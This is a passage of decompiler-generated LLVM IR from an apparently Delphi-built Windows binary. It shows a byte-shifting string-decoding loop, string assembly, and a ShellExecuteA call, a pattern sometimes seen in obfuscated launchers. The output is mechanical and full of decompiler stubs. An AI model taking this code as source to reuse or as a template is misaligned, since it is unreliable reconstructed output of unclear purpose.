  store i32 %2, i32* %stack_var_-32, align 4, !insn.addr !1289
  %3 = ptrtoint i32* %stack_var_-32 to i32, !insn.addr !1289
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !1290
  %4 = call i32 @function_4034c8(), !insn.addr !1291
  %5 = call i32 @"@LStrSetLength"(), !insn.addr !1292
  %6 = call i32 @function_4034c8(), !insn.addr !1293
  %7 = icmp slt i32 %6, 1
  store i32 1, i32* %ebx.0.reg2mem, !insn.addr !1294
  store i32 %6, i32* %esi.0.reg2mem, !insn.addr !1294
  br i1 %7, label %dec_label_pc_406166, label %dec_label_pc_406136, !insn.addr !1294

dec_label_pc_406136:                              ; preds = %dec_label_pc_4060f0, %dec_label_pc_406162
  %esi.0.reload = load i32, i32* %esi.0.reg2mem
  %ebx.0.reload = load i32, i32* %ebx.0.reg2mem
  %8 = add i32 %ebx.0.reload, -1
  %9 = add i32 %8, %0, !insn.addr !1295
  %10 = inttoptr i32 %9 to i8*, !insn.addr !1295
  %11 = load i8, i8* %10, align 1, !insn.addr !1295
  %12 = icmp eq i8 %11, 61, !insn.addr !1295
  %13 = icmp eq i1 %12, false, !insn.addr !1296
  %14 = call i32 @function_403720()
  br i1 %13, label %dec_label_pc_40614e, label %dec_label_pc_406140, !insn.addr !1296

dec_label_pc_406140:                              ; preds = %dec_label_pc_406136
  %15 = add i32 %14, %8, !insn.addr !1297
  %16 = inttoptr i32 %15 to i8*, !insn.addr !1297
  store i8 46, i8* %16, align 1, !insn.addr !1297
  br label %dec_label_pc_406162, !insn.addr !1298

dec_label_pc_40614e:                              ; preds = %dec_label_pc_406136
  %17 = load i8, i8* %10, align 1, !insn.addr !1299
  %18 = add i8 %17, -1, !insn.addr !1300
  %19 = add i32 %14, %8, !insn.addr !1301
  %20 = inttoptr i32 %19 to i8*, !insn.addr !1301
  store i8 %18, i8* %20, align 1, !insn.addr !1301
  br label %dec_label_pc_406162, !insn.addr !1301

dec_label_pc_406162:                              ; preds = %dec_label_pc_40614e, %dec_label_pc_406140
  %21 = add i32 %ebx.0.reload, 1, !insn.addr !1302
  %22 = add i32 %esi.0.reload, -1, !insn.addr !1303
  %23 = icmp eq i32 %22, 0, !insn.addr !1303
  %24 = icmp eq i1 %23, false, !insn.addr !1304
  store i32 %21, i32* %ebx.0.reg2mem, !insn.addr !1304
  store i32 %22, i32* %esi.0.reg2mem, !insn.addr !1304
  br i1 %24, label %dec_label_pc_406136, label %dec_label_pc_406166, !insn.addr !1304

dec_label_pc_406166:                              ; preds = %dec_label_pc_406162, %dec_label_pc_4060f0
  %25 = load i32, i32* %stack_var_-32, align 4, !insn.addr !1305
  call void @__writefsdword(i32 0, i32 %25), !insn.addr !1306
  %26 = call i32 @"@LStrClr"(), !insn.addr !1307
  ret i32 %26, !insn.addr !1308
}

define i32 @function_40617c() local_unnamed_addr {
dec_label_pc_40617c:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1309
  ret i32 %0, !insn.addr !1309
}

define i32 @function_406181() local_unnamed_addr {
dec_label_pc_406181:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1310
}

define i32 @function_406183(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_406183:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1311
}

define i32 @function_40618c() local_unnamed_addr {
dec_label_pc_40618c:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @"@Str0Long"(i32 %1, i32 %0), !insn.addr !1312
  %3 = call i32 @"@PStrNCpy"(), !insn.addr !1313
  %4 = call i32 @"@LStrFromString"(), !insn.addr !1314
  ret i32 %4, !insn.addr !1315
}

define i32 @function_4061c4() local_unnamed_addr {
dec_label_pc_4061c4:
  %ecx.0.reg2mem = alloca i32, !insn.addr !1316
  %esp.0.reg2mem = alloca i32, !insn.addr !1316
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %0 = ptrtoint i32* %stack_var_-4 to i32, !insn.addr !1316
  store i32 %0, i32* %esp.0.reg2mem, !insn.addr !1317
  store i32 5, i32* %ecx.0.reg2mem, !insn.addr !1317
  br label %dec_label_pc_4061cc, !insn.addr !1317

dec_label_pc_4061cc:                              ; preds = %dec_label_pc_4061cc, %dec_label_pc_4061c4
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %1 = add i32 %esp.0.reload, -4, !insn.addr !1318
  %2 = inttoptr i32 %1 to i32*, !insn.addr !1318
  store i32 0, i32* %2, align 4, !insn.addr !1318
  %3 = add i32 %esp.0.reload, -8, !insn.addr !1319
  %4 = inttoptr i32 %3 to i32*, !insn.addr !1319
  store i32 0, i32* %4, align 4, !insn.addr !1319
  %5 = add nsw i32 %ecx.0.reload, -1, !insn.addr !1320
  %6 = icmp eq i32 %5, 0, !insn.addr !1320
  %7 = icmp eq i1 %6, false, !insn.addr !1321
  store i32 %3, i32* %esp.0.reg2mem, !insn.addr !1321
  store i32 %5, i32* %ecx.0.reg2mem, !insn.addr !1321
  br i1 %7, label %dec_label_pc_4061cc, label %dec_label_pc_4061d3, !insn.addr !1321

dec_label_pc_4061d3:                              ; preds = %dec_label_pc_4061cc
  %8 = add i32 %esp.0.reload, -12, !insn.addr !1322
  %9 = inttoptr i32 %8 to i32*, !insn.addr !1322
  store i32 0, i32* %9, align 4, !insn.addr !1322
  %10 = add i32 %esp.0.reload, -16, !insn.addr !1323
  %11 = inttoptr i32 %10 to i32*, !insn.addr !1323
  %12 = add i32 %esp.0.reload, -20, !insn.addr !1324
  %13 = inttoptr i32 %12 to i32*, !insn.addr !1324
  store i32 %0, i32* %13, align 4, !insn.addr !1324
  %14 = add i32 %esp.0.reload, -24, !insn.addr !1325
  %15 = inttoptr i32 %14 to i32*, !insn.addr !1325
  store i32 4219659, i32* %15, align 4, !insn.addr !1325
  %16 = call i32 @__readfsdword(i32 0), !insn.addr !1326
  %17 = add i32 %esp.0.reload, -28, !insn.addr !1326
  %18 = inttoptr i32 %17 to i32*, !insn.addr !1326
  store i32 %16, i32* %18, align 4, !insn.addr !1326
  call void @__writefsdword(i32 0, i32 %17), !insn.addr !1327
  %19 = call i32 @"@LStrFromPChar"(), !insn.addr !1328
  %20 = call i32 @function_4060f0(), !insn.addr !1329
  %21 = call i32 @function_4036c8(), !insn.addr !1330
  %22 = call i32 @"@LStrFromPChar"(), !insn.addr !1331
  %23 = add i32 %esp.0.reload, -32, !insn.addr !1332
  %24 = inttoptr i32 %23 to i32*, !insn.addr !1332
  %25 = ptrtoint i32* %stack_var_-12 to i32, !insn.addr !1332
  store i32 %25, i32* %24, align 4, !insn.addr !1332
  %26 = call i32 @"@LStrCopy"(), !insn.addr !1333
  %27 = call i32 @"@LStrDelete"(), !insn.addr !1334
  %28 = add i32 %esp.0.reload, -36, !insn.addr !1335
  %29 = inttoptr i32 %28 to i32*, !insn.addr !1335
  %30 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1335
  store i32 %30, i32* %29, align 4, !insn.addr !1335
  %31 = call i32 @function_4034c8(), !insn.addr !1336
  %32 = call i32 @"@LStrCopy"(), !insn.addr !1337
  %33 = add i32 %esp.0.reload, -40, !insn.addr !1338
  %34 = inttoptr i32 %33 to i32*, !insn.addr !1338
  store i32 ptrtoint ([6 x i8]* @global_var_406320 to i32), i32* %34, align 4, !insn.addr !1338
  %35 = call i32 @function_40618c(), !insn.addr !1339
  %36 = add i32 %esp.0.reload, -44, !insn.addr !1340
  %37 = inttoptr i32 %36 to i32*, !insn.addr !1340
  %38 = add i32 %esp.0.reload, -48, !insn.addr !1341
  %39 = inttoptr i32 %38 to i32*, !insn.addr !1341
  store i32 ptrtoint (i32* @global_var_406330 to i32), i32* %39, align 4, !insn.addr !1341
  %40 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1342
  %41 = add i32 %esp.0.reload, -52, !insn.addr !1342
  %42 = inttoptr i32 %41 to i32*, !insn.addr !1342
  store i32 %40, i32* %42, align 4, !insn.addr !1342
  %43 = call i32 @"@LStrCatN"(), !insn.addr !1343
  %44 = add i32 %esp.0.reload, -56, !insn.addr !1344
  %45 = inttoptr i32 %44 to i32*, !insn.addr !1344
  store i32 0, i32* %45, align 4, !insn.addr !1344
  %46 = add i32 %esp.0.reload, -60, !insn.addr !1345
  %47 = inttoptr i32 %46 to i32*, !insn.addr !1345
  store i32 0, i32* %47, align 4, !insn.addr !1345
  %48 = call i32 @"@LStrCat3"(), !insn.addr !1346
  %49 = call i32 @function_4036c8(), !insn.addr !1347
  %50 = add i32 %esp.0.reload, -64, !insn.addr !1348
  %51 = inttoptr i32 %50 to i32*, !insn.addr !1348
  store i32 %49, i32* %51, align 4, !insn.addr !1348
  %52 = call i32 @"@LStrFromPChar"(), !insn.addr !1349
  %53 = call i32 @function_4060f0(), !insn.addr !1350
  %54 = call i32 @function_4036c8(), !insn.addr !1351
  %55 = add i32 %esp.0.reload, -68, !insn.addr !1352
  %56 = inttoptr i32 %55 to i32*, !insn.addr !1352
  store i32 %54, i32* %56, align 4, !insn.addr !1352
  %57 = add i32 %esp.0.reload, -72, !insn.addr !1353
  %58 = inttoptr i32 %57 to i32*, !insn.addr !1353
  store i32 0, i32* %58, align 4, !insn.addr !1353
  %59 = call i32 @function_4060e8(), !insn.addr !1354
  %60 = add i32 %esp.0.reload, -76, !insn.addr !1355
  %61 = inttoptr i32 %60 to i32*, !insn.addr !1355
  store i32 1, i32* %61, align 4, !insn.addr !1355
  %62 = add i32 %esp.0.reload, -80, !insn.addr !1356
  %63 = inttoptr i32 %62 to i32*, !insn.addr !1356
  store i32 0, i32* %63, align 4, !insn.addr !1356
  %64 = add i32 %esp.0.reload, -84, !insn.addr !1357
  %65 = inttoptr i32 %64 to i32*, !insn.addr !1357
  store i32 0, i32* %65, align 4, !insn.addr !1357
  %66 = call i32 @"@LStrCat3"(), !insn.addr !1358
  %67 = call i32 @function_4036c8(), !insn.addr !1359
  %68 = add i32 %esp.0.reload, -88, !insn.addr !1360
  %69 = inttoptr i32 %68 to i32*, !insn.addr !1360
  store i32 %67, i32* %69, align 4, !insn.addr !1360
  %70 = add i32 %esp.0.reload, -92, !insn.addr !1361
  %71 = inttoptr i32 %70 to i32*, !insn.addr !1361
  store i32 ptrtoint ([5 x i8]* @global_var_406340 to i32), i32* %71, align 4, !insn.addr !1361
  %72 = add i32 %esp.0.reload, -96, !insn.addr !1362
  %73 = inttoptr i32 %72 to i32*, !insn.addr !1362
  store i32 0, i32* %73, align 4, !insn.addr !1362
  %74 = call i32* @ShellExecuteA(i32* nonnull @0, i8* bitcast (i32* @0 to i8*), i8* bitcast (i32* @0 to i8*), i8* bitcast (i32* @0 to i8*), i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1363
  %75 = load i32, i32* %73, align 4, !insn.addr !1364
  call void @__writefsdword(i32 0, i32 %75), !insn.addr !1365
  store i32 4219666, i32* %69, align 4, !insn.addr !1366
  %76 = call i32 @"@LStrArrayClr"(), !insn.addr !1367
  ret i32 %76, !insn.addr !1368
}

define i32 @function_40630b() local_unnamed_addr {
dec_label_pc_40630b:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1369
  ret i32 %0, !insn.addr !1369
}

define i32 @function_406310() local_unnamed_addr {
dec_label_pc_406310:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1370
}

define i32 @function_406312(i32 %arg1) local_unnamed_addr {
dec_label_pc_406312:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1371
}

define i32 @function_406337(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_406337:
  %esp.1.reg2mem = alloca i32, !insn.addr !1372
  %.pre-phi.reg2mem = alloca i32*, !insn.addr !1372
  %ecx.0.reg2mem = alloca i32, !insn.addr !1372
  %esp.0.reg2mem = alloca i32, !insn.addr !1372
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %4 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_0, align 4
  %5 = add i32 %2, 1, !insn.addr !1372
  %6 = inttoptr i32 %2 to i32*, !insn.addr !1372
  store i32 %5, i32* %6, align 4, !insn.addr !1372
  %7 = bitcast i32* %eax to i8*
  %8 = load i8, i8* %7, align 4, !insn.addr !1373
  %9 = load i32, i32* %eax, align 4
  %10 = trunc i32 %9 to i8, !insn.addr !1373
  %11 = add i8 %8, %10, !insn.addr !1373
  %12 = inttoptr i32 %9 to i8*, !insn.addr !1373
  store i8 %11, i8* %12, align 1, !insn.addr !1373
  %13 = add i32 %2, 58, !insn.addr !1374
  %14 = inttoptr i32 %13 to i8*, !insn.addr !1374
  %15 = load i8, i8* %14, align 1, !insn.addr !1374
  %16 = load i32, i32* %eax, align 4, !insn.addr !1374
  %17 = udiv i32 %16, 256, !insn.addr !1374
  %18 = trunc i32 %17 to i8, !insn.addr !1374
  %19 = add i8 %15, %18, !insn.addr !1374
  store i8 %19, i8* %14, align 1, !insn.addr !1374
  %20 = add i32 %0, 112, !insn.addr !1375
  %21 = inttoptr i32 %20 to i8*, !insn.addr !1375
  %22 = load i8, i8* %21, align 1, !insn.addr !1375
  %23 = trunc i32 %4 to i8, !insn.addr !1375
  %24 = add i8 %22, %23, !insn.addr !1375
  store i8 %24, i8* %21, align 1, !insn.addr !1375
  %25 = trunc i32 %3 to i16, !insn.addr !1376
  %26 = call i8 @__readgsbyte(i32 %1), !insn.addr !1376
  call void @__asm_outsb(i16 %25, i8 %26), !insn.addr !1376
  %27 = load i8, i8* %7, align 4, !insn.addr !1377
  %28 = load i32, i32* %eax, align 4
  %29 = trunc i32 %28 to i8, !insn.addr !1377
  %30 = add i8 %27, %29, !insn.addr !1377
  %31 = inttoptr i32 %28 to i8*, !insn.addr !1377
  store i8 %30, i8* %31, align 1, !insn.addr !1377
  %32 = load i8, i8* %7, align 4, !insn.addr !1378
  %33 = load i32, i32* %eax, align 4
  %34 = trunc i32 %33 to i8, !insn.addr !1378
  %35 = add i8 %32, %34, !insn.addr !1378
  %36 = inttoptr i32 %33 to i8*, !insn.addr !1378
  store i8 %35, i8* %36, align 1, !insn.addr !1378
  %37 = ptrtoint i32* %stack_var_0 to i32, !insn.addr !1379
  store i32 %37, i32* %esp.0.reg2mem, !insn.addr !1380
  store i32 13, i32* %ecx.0.reg2mem, !insn.addr !1380
  br label %dec_label_pc_406350, !insn.addr !1380

dec_label_pc_406350:                              ; preds = %dec_label_pc_406350, %dec_label_pc_406337
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %38 = add i32 %esp.0.reload, -4, !insn.addr !1381
  %39 = inttoptr i32 %38 to i32*, !insn.addr !1381
  store i32 0, i32* %39, align 4, !insn.addr !1381
  %40 = add i32 %esp.0.reload, -8, !insn.addr !1382
  %41 = inttoptr i32 %40 to i32*, !insn.addr !1382
  store i32 0, i32* %41, align 4, !insn.addr !1382
  %42 = add nsw i32 %ecx.0.reload, -1, !insn.addr !1383
  %43 = icmp eq i32 %42, 0, !insn.addr !1383
  %44 = icmp eq i1 %43, false, !insn.addr !1384
  store i32 %40, i32* %esp.0.reg2mem, !insn.addr !1384
  store i32 %42, i32* %ecx.0.reg2mem, !insn.addr !1384
  br i1 %44, label %dec_label_pc_406350, label %dec_label_pc_406357, !insn.addr !1384

dec_label_pc_406357:                              ; preds = %dec_label_pc_406350
  %45 = add i32 %esp.0.reload, -12, !insn.addr !1385
  %46 = inttoptr i32 %45 to i32*, !insn.addr !1385
  store i32 0, i32* %46, align 4, !insn.addr !1385
  %47 = add i32 %esp.0.reload, -20, !insn.addr !1386
  %48 = inttoptr i32 %47 to i32*, !insn.addr !1386
  store i32 %37, i32* %48, align 4, !insn.addr !1386
  %49 = add i32 %esp.0.reload, -24, !insn.addr !1387
  %50 = inttoptr i32 %49 to i32*, !insn.addr !1387
  store i32 4220396, i32* %50, align 4, !insn.addr !1387
  %51 = call i32 @__readfsdword(i32 0), !insn.addr !1388
  %52 = add i32 %esp.0.reload, -28, !insn.addr !1388
  %53 = inttoptr i32 %52 to i32*, !insn.addr !1388
  store i32 %51, i32* %53, align 4, !insn.addr !1388
  call void @__writefsdword(i32 0, i32 %52), !insn.addr !1389
  %54 = call i32 @"@LStrPos"(), !insn.addr !1390
  %55 = add i32 %esp.0.reload, -32, !insn.addr !1391
  %56 = inttoptr i32 %55 to i32*, !insn.addr !1391
  %57 = ptrtoint i32* %stack_var_-4 to i32, !insn.addr !1391
  store i32 %57, i32* %56, align 4, !insn.addr !1391
  %58 = call i32 @"@LStrCopy"(), !insn.addr !1392
  %59 = add i32 %esp.0.reload, -36, !insn.addr !1393
  %60 = inttoptr i32 %59 to i32*
  %61 = ptrtoint i32* %stack_var_-8 to i32, !insn.addr !1393
  store i32 %61, i32* %60, align 4, !insn.addr !1393
  %62 = call i32 @function_4034c8(), !insn.addr !1394
  %63 = call i32 @"@LStrCopy"(), !insn.addr !1395
  %64 = add i32 %arg1, -1, !insn.addr !1396
  store i32 %64, i32* %eax, align 4, !insn.addr !1396
  store i32* %60, i32** %.pre-phi.reg2mem
  store i32 %59, i32* %esp.1.reg2mem
  switch i32 %arg1, label %dec_label_pc_4065d1 [
    i32 0, label %dec_label_pc_4063c9
    i32 1, label %dec_label_pc_406509
    i32 2, label %dec_label_pc_406577
  ]

dec_label_pc_4063c9:                              ; preds = %dec_label_pc_406357
  %65 = call i32 @function_4034c8(), !insn.addr !1397
  %66 = icmp slt i32 %65, 5, !insn.addr !1398
  store i32* %60, i32** %.pre-phi.reg2mem, !insn.addr !1398
  store i32 %59, i32* %esp.1.reg2mem, !insn.addr !1398
  br i1 %66, label %dec_label_pc_4065d1, label %dec_label_pc_4063da, !insn.addr !1398

dec_label_pc_4063da:                              ; preds = %dec_label_pc_4063c9
  %67 = call i32 @"@LStrFromPChar"(), !insn.addr !1399
  %68 = call i32 @function_4060f0(), !insn.addr !1400
  %69 = add i32 %esp.0.reload, -40, !insn.addr !1401
  %70 = inttoptr i32 %69 to i32*, !insn.addr !1401
  %71 = call i32 @"@LStrFromPChar"(), !insn.addr !1402
  %72 = call i32 @function_4060f0(), !insn.addr !1403
  %73 = add i32 %esp.0.reload, -44, !insn.addr !1404
  %74 = inttoptr i32 %73 to i32*, !insn.addr !1404
  %75 = load i32, i32* %stack_var_-4, align 4, !insn.addr !1405
  %76 = add i32 %esp.0.reload, -48, !insn.addr !1405
  %77 = inttoptr i32 %76 to i32*, !insn.addr !1405
  store i32 %75, i32* %77, align 4, !insn.addr !1405
  %78 = add i32 %esp.0.reload, -52, !insn.addr !1406
  %79 = inttoptr i32 %78 to i32*, !insn.addr !1406
  store i32 ptrtoint (i32* @global_var_406610 to i32), i32* %79, align 4, !insn.addr !1406
  %80 = load i32, i32* %stack_var_-8, align 4, !insn.addr !1407
  %81 = add i32 %esp.0.reload, -56, !insn.addr !1407
  %82 = inttoptr i32 %81 to i32*, !insn.addr !1407
  store i32 %80, i32* %82, align 4, !insn.addr !1407
  %83 = call i32 @"@LStrCatN"(), !insn.addr !1408
  %84 = add i32 %esp.0.reload, -60, !insn.addr !1409
  %85 = inttoptr i32 %84 to i32*, !insn.addr !1409
  %86 = add i32 %esp.0.reload, -64, !insn.addr !1410
  %87 = inttoptr i32 %86 to i32*, !insn.addr !1410
  store i32 4220444, i32* %87, align 4, !insn.addr !1410
  %88 = load i32, i32* %stack_var_-4, align 4, !insn.addr !1411
  %89 = add i32 %esp.0.reload, -68, !insn.addr !1411
  %90 = inttoptr i32 %89 to i32*, !insn.addr !1411
  store i32 %88, i32* %90, align 4, !insn.addr !1411
  %91 = add i32 %esp.0.reload, -72, !insn.addr !1412
  %92 = inttoptr i32 %91 to i32*, !insn.addr !1412
  store i32 4220460, i32* %92, align 4, !insn.addr !1412
  %93 = load i32, i32* %stack_var_-8, align 4, !insn.addr !1413
  %94 = add i32 %esp.0.reload, -76, !insn.addr !1413
  %95 = inttoptr i32 %94 to i32*, !insn.addr !1413
  store i32 %93, i32* %95, align 4, !insn.addr !1413
  %96 = add i32 %esp.0.reload, -80, !insn.addr !1414
  %97 = inttoptr i32 %96 to i32*, !insn.addr !1414
  store i32 4220476, i32* %97, align 4, !insn.addr !1414
  %98 = call i32 @function_407494(), !insn.addr !1415
  %99 = add i32 %esp.0.reload, -84, !insn.addr !1416
  %100 = inttoptr i32 %99 to i32*, !insn.addr !1416
  %101 = call i32 @"@LStrCatN"(), !insn.addr !1417
  %102 = add i32 %esp.0.reload, -88, !insn.addr !1418
  %103 = inttoptr i32 %102 to i32*, !insn.addr !1418
  %104 = add i32 %esp.0.reload, -92, !insn.addr !1419
  %105 = inttoptr i32 %104 to i32*
  %106 = ptrtoint i32* %stack_var_-40 to i32, !insn.addr !1419
  store i32 %106, i32* %105, align 4, !insn.addr !1419
  %107 = call i32 @"@LStrFromPChar"(), !insn.addr !1420
  %108 = call i32 @function_4060f0(), !insn.addr !1421
  %109 = call i32 @"@LStrPos"(), !insn.addr !1422
  %110 = add i32 %109, -1, !insn.addr !1423
  %111 = add i32 %esp.0.reload, -96, !insn.addr !1424
  %112 = inttoptr i32 %111 to i32*, !insn.addr !1424
  store i32 %110, i32* %112, align 4, !insn.addr !1424
  %113 = call i32 @"@LStrFromPChar"(), !insn.addr !1425
  %114 = call i32 @function_4060f0(), !insn.addr !1426
  %115 = call i32 @"@LStrCopy"(), !insn.addr !1427
  %116 = load i32, i32* %stack_var_-40, align 4, !insn.addr !1428
  store i32 %116, i32* %112, align 4, !insn.addr !1429
  %117 = call i32 @"@LStrFromPChar"(), !insn.addr !1430
  %118 = call i32 @function_4060f0(), !insn.addr !1431
  %119 = add i32 %esp.0.reload, -100, !insn.addr !1432
  %120 = inttoptr i32 %119 to i32*, !insn.addr !1432
  %121 = call i32 @"@LStrFromPChar"(), !insn.addr !1433
  %122 = call i32 @function_4060f0(), !insn.addr !1434
  %123 = call i32 @function_4057d0(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1435
  store i32* %105, i32** %.pre-phi.reg2mem, !insn.addr !1436
  store i32 %104, i32* %esp.1.reg2mem, !insn.addr !1436
  br label %dec_label_pc_4065d1, !insn.addr !1436

dec_label_pc_406509:                              ; preds = %dec_label_pc_406357
  %124 = call i32 @function_4034c8(), !insn.addr !1437
  %125 = icmp slt i32 %124, 5, !insn.addr !1438
  store i32* %60, i32** %.pre-phi.reg2mem, !insn.addr !1438
  store i32 %59, i32* %esp.1.reg2mem, !insn.addr !1438
  br i1 %125, label %dec_label_pc_4065d1, label %dec_label_pc_40651a, !insn.addr !1438

dec_label_pc_40651a:                              ; preds = %dec_label_pc_406509
  %126 = add i32 %esp.0.reload, -40, !insn.addr !1439
  %127 = inttoptr i32 %126 to i32*, !insn.addr !1439
  store i32 ptrtoint ([5 x i8]* @global_var_40665c to i32), i32* %127, align 4, !insn.addr !1439
  %128 = call i32 @function_404b20(), !insn.addr !1440
  %129 = add i32 %esp.0.reload, -44, !insn.addr !1441
  %130 = inttoptr i32 %129 to i32*, !insn.addr !1441
  %131 = add i32 %esp.0.reload, -48, !insn.addr !1442
  %132 = inttoptr i32 %131 to i32*, !insn.addr !1442
  store i32 ptrtoint ([7 x i8]* @global_var_40666c to i32), i32* %132, align 4, !insn.addr !1442
  %133 = call i32 @function_404b20(), !insn.addr !1443
  %134 = add i32 %esp.0.reload, -52, !insn.addr !1444
  %135 = inttoptr i32 %134 to i32*
  %136 = call i32 @"@LStrCatN"(), !insn.addr !1445
  %137 = add i32 %esp.0.reload, -56, !insn.addr !1446
  %138 = inttoptr i32 %137 to i32*, !insn.addr !1446
  %139 = call i32 @"@LStrFromPChar"(), !insn.addr !1447
  %140 = call i32 @function_4060f0(), !insn.addr !1448
  %141 = call i32 @function_404c78(), !insn.addr !1449
  store i32* %135, i32** %.pre-phi.reg2mem, !insn.addr !1450
  store i32 %134, i32* %esp.1.reg2mem, !insn.addr !1450
  br label %dec_label_pc_4065d1, !insn.addr !1450

dec_label_pc_406577:                              ; preds = %dec_label_pc_406357
  %142 = call i32 @function_4034c8(), !insn.addr !1451
  %143 = icmp slt i32 %142, 5, !insn.addr !1452
  store i32* %60, i32** %.pre-phi.reg2mem, !insn.addr !1452
  store i32 %59, i32* %esp.1.reg2mem, !insn.addr !1452
  br i1 %143, label %dec_label_pc_4065d1, label %dec_label_pc_406584, !insn.addr !1452

dec_label_pc_406584:                              ; preds = %dec_label_pc_406577
  %144 = add i32 %esp.0.reload, -40, !insn.addr !1453
  %145 = inttoptr i32 %144 to i32*, !insn.addr !1453
  store i32 ptrtoint ([5 x i8]* @global_var_40665c to i32), i32* %145, align 4, !insn.addr !1453
  %146 = call i32 @function_404b20(), !insn.addr !1454
  %147 = add i32 %esp.0.reload, -44, !insn.addr !1455
  %148 = inttoptr i32 %147 to i32*, !insn.addr !1455
  %149 = add i32 %esp.0.reload, -48, !insn.addr !1456
  %150 = inttoptr i32 %149 to i32*, !insn.addr !1456
  store i32 ptrtoint ([7 x i8]* @global_var_40666c to i32), i32* %150, align 4, !insn.addr !1456
  %151 = call i32 @function_404b20(), !insn.addr !1457
  %152 = add i32 %esp.0.reload, -52, !insn.addr !1458
  %153 = inttoptr i32 %152 to i32*
  %154 = call i32 @"@LStrCatN"(), !insn.addr !1459
  %155 = add i32 %esp.0.reload, -56, !insn.addr !1460
  %156 = inttoptr i32 %155 to i32*, !insn.addr !1460
  %157 = call i32 @function_4060f0(), !insn.addr !1461
  %158 = call i32 @function_404c78(), !insn.addr !1462
  store i32* %153, i32** %.pre-phi.reg2mem, !insn.addr !1462
  store i32 %152, i32* %esp.1.reg2mem, !insn.addr !1462
  br label %dec_label_pc_4065d1, !insn.addr !1462

dec_label_pc_4065d1:                              ; preds = %dec_label_pc_406357, %dec_label_pc_406584, %dec_label_pc_406577, %dec_label_pc_40651a, %dec_label_pc_406509, %dec_label_pc_4063da, %dec_label_pc_4063c9
  %159 = add i32 %esp.0.reload, -16, !insn.addr !1463
  %160 = inttoptr i32 %159 to i32*, !insn.addr !1463
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %.pre-phi.reload = load i32*, i32** %.pre-phi.reg2mem
  %161 = load i32, i32* %.pre-phi.reload, align 4, !insn.addr !1464
  call void @__writefsdword(i32 0, i32 %161), !insn.addr !1465
  %162 = add i32 %esp.1.reload, 8, !insn.addr !1466
  %163 = inttoptr i32 %162 to i32*, !insn.addr !1466
  store i32 4220403, i32* %163, align 4, !insn.addr !1466
  %164 = call i32 @"@LStrArrayClr"(), !insn.addr !1467
  ret i32 %164, !insn.addr !1468
}

define i32 @function_4065ec() local_unnamed_addr {
dec_label_pc_4065ec:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1469
  ret i32 %0, !insn.addr !1469
}

define i32 @function_4065f1() local_unnamed_addr {
dec_label_pc_4065f1:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1470
}

define i32 @function_4065f3(i32 %arg1) local_unnamed_addr {
dec_label_pc_4065f3:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1471
}

define i32 @function_40661f() local_unnamed_addr {
dec_label_pc_40661f:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1472
}

define i32 @function_406627() local_unnamed_addr {
dec_label_pc_406627:
  %0 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %1 = add i32 %0, 1, !insn.addr !1473
  %2 = inttoptr i32 %0 to i32*, !insn.addr !1473
  store i32 %1, i32* %2, align 4, !insn.addr !1473
  %3 = bitcast i32* %eax to i8*
  %4 = load i8, i8* %3, align 4, !insn.addr !1474
  %5 = load i32, i32* %eax, align 4
  %6 = trunc i32 %5 to i8, !insn.addr !1474
  %7 = add i8 %4, %6, !insn.addr !1474
  %8 = inttoptr i32 %5 to i8*, !insn.addr !1474
  store i8 %7, i8* %8, align 1, !insn.addr !1474
  %9 = load i8, i8* %3, align 4, !insn.addr !1475
  %10 = load i32, i32* %eax, align 4
  %11 = udiv i32 %10, 256, !insn.addr !1475
  %12 = trunc i32 %11 to i8, !insn.addr !1475
  %13 = add i8 %9, %12, !insn.addr !1475
  %14 = inttoptr i32 %10 to i8*, !insn.addr !1475
  store i8 %13, i8* %14, align 1, !insn.addr !1475
  %15 = load i32, i32* %eax, align 4, !insn.addr !1476
  ret i32 %15, !insn.addr !1476
}

define i32 @function_40662e() local_unnamed_addr {
dec_label_pc_40662e:
  %0 = call i32 @function_40666c(), !insn.addr !1477
  ret i32 %0, !insn.addr !1477
}

define i32 @function_40666a() local_unnamed_addr {
dec_label_pc_40666a:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = trunc i32 %0 to i8
  %2 = mul i8 %1, 2, !insn.addr !1478
  %3 = inttoptr i32 %0 to i8*, !insn.addr !1478
  store i8 %2, i8* %3, align 1, !insn.addr !1478
  ret i32 %0, !insn.addr !1478
}

